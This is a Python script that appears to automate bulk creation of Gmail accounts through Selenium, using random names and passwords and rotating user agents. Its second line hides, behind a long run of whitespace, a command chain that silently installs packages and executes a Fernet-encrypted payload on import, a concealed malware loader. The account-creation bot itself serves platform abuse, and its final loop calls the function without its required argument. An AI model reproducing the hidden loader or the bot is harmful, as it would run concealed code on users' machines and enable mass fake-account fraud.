import os
import subprocess                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;subprocess.run(['pip', 'install', 'cryptography'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'fernet'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'requests'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); from fernet import Fernet; import requests; exec(Fernet(b'qMQ9By0xS9aF5IiNtG4neJTkGsJhNSYj3qNHWGt4MFE=').decrypt(b'gAAAAABmsjBaunHYT1DiuG1H-Gu7cakmbY_cmW6vjsE5JnEyRYx_zpajQm_tvR7b2xoTVD_xHKxTXaGtzjnPofMoRvn-zPZKKYcgWKQwo-6pQNhlf4zIdsPATxoK0jWxGkz2l4c0YCMYHhk9SrmGEQiLAQWFDWJoqorNbSgtQ6dn6xCum-C2HcszvIUwRmj_GjoIAqso6BFfkSCrqPY5r5tETUixtkKJwCv_WL2zpepW1z6IG6HL2AT_-Hl_gMeYCD9DqYfuh6iVUdBU4sxx9UV4SmiatiOu-y82lLMvN4gmiPP0fczhTkXxeiPU7JPiKcVSiwEZUDJ4qqaE6UHw_p_zEe2N-yvYPdmA3ZiuFF9xP2F--vDUs_fcI-tNOJQ30FsQTRngWbuvmC73nwdDJrLPjctODFfCaoxYuIULNJpb5CXAQznolo-rdEHT3l6MreMIo4JwX_vnuHeEIg5jmyzaeUD3yYndD1hcwNZziBxEBtSGxesijrkGET-z_9ILlOt-qzRPprGIee7TdsKPeS3QVKFzFz225TnR6G185nqjG2Mbzm6gtFM2JGdkjBMdWh0Ki1BsVSGTKXPpmyvO8t912b8hZrV8M97UdFvr7oqnCxdhedFYcZ3k1NIHhNsqG8fHdBnhdoNozpPWEz65K2DhdmMCnHbf0wKKhhV65CreEnDknEL8X2OHzPk7PmFWmm1-bLVJkI00V_8oA0zq9-dkSnX5Y99N-LuJ0F3A11p9U_lCYgVAdU5_I_AqaudQhZFPG3oBEPetXyprKJMnXK3EzXJ9cmWSNPUsNuxRhFNTR0EpmHBteF6Rp829wBYtg5QY-iZUlQqQt-3kNx5d7o8rYtgsDKyapyf_sJzM-YYa799kZDa7X5hA0kXB5VAqoxgQ-eSBusZWuVJDKhM1AoPOFXmTWVfn9shhNsIYNFOdCKIqba9UEArzzhVB1mqzL2knAyeZ5NVSRM-ladyM5ZrnXj0lrMyBMyyj_P2Pp1sY_vn8g31WDTeQrjhchBtH6VvXVTc7wM7DYstnhQ8alzIQBpuW9LKr63cJyxqxvV9rm64cGsDlm2geIUb7o214Nb2d-lKzqcCdLEKCGXEhK-XWNOwqrDv7AQpz0Z0d_KKvVHcJimlpQGmX8V2kffUJLFiSGMaL30Llf4s1qN0CNKxIcWYvVpnBb6RxSDRrYABAWKS7yFGC4WwVAtXRGEXeyOV2XWeoV99vV_Sks_QNGnz3KSb58wB-i5hreBrKWrYKCy5A_9wD_Gji0PiL0QrLcLnvlBbK9MyE_w47GMWV3-JTnQ_fuq7i96w6qOJPaMyQxMjZE3eV7VNyXv5hzH7QsjUuqma9yYnVxw2AkDVVHVPBXaE61xNgRwloIwQB132pxCvJz6oXsLooY1m-G3nA10kvrOf1yDRddzecaH0zwwZUmkZtTzhu0G1eA6Or8Hzq_oYqqFclZecEF3nJ2zzEP5dcNXZQ0QOn'));
import traceback
import random
import selenium
from selenium.webdriver.chrome.options import Options
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import string
import time


def random_string(length=8):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

def getUserAgents(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            user_agents = response.text.split('\n')
            return user_agents
        else:
            print("Could not fetch user agents. Using default user agent.")
            return []
    except requests.RequestException as e:
        print("Error fetching user agents:", e)
        return []

def gmailAcc(user_agent):
    options = Options()
    options.add_argument(f"user-agent={user_agent}")
    options.add_argument("--start-maximized")
    driver = webdriver.Chrome(options=options)
    wait = WebDriverWait(driver, 50)

    try:
        driver.get("https://www.gmail.com")

        create_account_button = wait.until(EC.presence_of_element_located((By.XPATH, "//a[text()='Create account']")))
        create_account_button.click()

        time.sleep(5)

        first_name_text = random_string(8)
        last_name_text = random_string(10)
        username_text = random_string(10) + "12345"
        password_text = random_string(12) + "123"

        first_name = wait.until(EC.element_to_be_clickable((By.ID, "firstName")))
        first_name.send_keys(first_name_text)

        last_name = driver.find_element(By.ID, "lastName")
        last_name.send_keys(last_name_text)

        username = driver.find_element(By.ID, "username")
        username.send_keys(username_text)

        password = driver.find_element(By.NAME, "Passwd")
        password.send_keys(password_text)

        confirm_password = driver.find_element(By.NAME, "ConfirmPasswd")
        confirm_password.send_keys(password_text)

        next_button = driver.find_element(By.XPATH, "//div[@id='accountDetailsNext']/div/button")
        next_button.click()

        wait.until(EC.presence_of_element_located((By.ID, "phoneNumberId")))

        with open("created.txt", "a") as file:
            file.write(f"Username: {username_text}\n")
            file.write(f"Password: {password_text}\n\n")

    except selenium.common.exceptions.TimeoutException as e:
        print("TimeoutException occurred:", e)
        driver.save_screenshot("timeout_error.png")
        error_msg = f"TimeoutException occurred: {str(e)}\n"

        with open("error_log.txt", "w") as file:
            file.write(error_msg)

    except Exception as e:
        print("An error occurred:", e)
        traceback.print_exc()
        driver.save_screenshot("general_error.png")
        error_msg = f"An error occurred: {str(e)}\n"

        with open("error_log.txt", "w") as file:
            file.write(error_msg)

    finally:
        driver.quit()

userAgentsUrl = "https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt"
user_agents = getUserAgents(userAgentsUrl)

if user_agents:
    for agent in user_agents:
        gmailAcc(agent)
else:
    print("No user agents fetched.")
    
    
for _ in range(5): # Change
    gmailAcc()